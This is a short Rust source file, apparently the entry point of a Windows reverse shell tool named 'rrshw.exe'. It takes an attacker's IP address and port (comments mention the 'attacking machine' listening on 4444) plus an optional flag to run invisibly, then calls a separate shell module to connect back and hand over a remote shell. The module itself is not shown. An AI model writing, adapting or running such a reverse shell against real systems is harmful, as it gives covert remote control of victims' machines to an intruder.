mod rsh;
use std::env;
use std::net::Ipv4Addr;


// IP address of the attacking machine
//pub const IP: &str = "127.0.0.1";
// Port the attacking machine is listening on
//pub const PORT: u16 = 4444;
fn main(){
   let args: Vec<String> = env::args().collect();
   let len=args.len();
   if len>=3{
      let ip=&args[1];
      let ipv4:Ipv4Addr=ip.parse().expect(&"IP incorrect!!");
      let port :u16=args[2].parse().expect(&"PORT incorrect!!");
      let mut invisible='n';
      if len==4{
         let a3=args[3].chars().next().unwrap();         
         if a3=='y' {invisible='y';}
      }
      rsh::shell(ipv4,port,invisible);

      
   }else{
      println!("rrshw.exe [ip] [port] [invisible(y/n=default)]");
   }

   //rsh::shell(IP,PORT);
}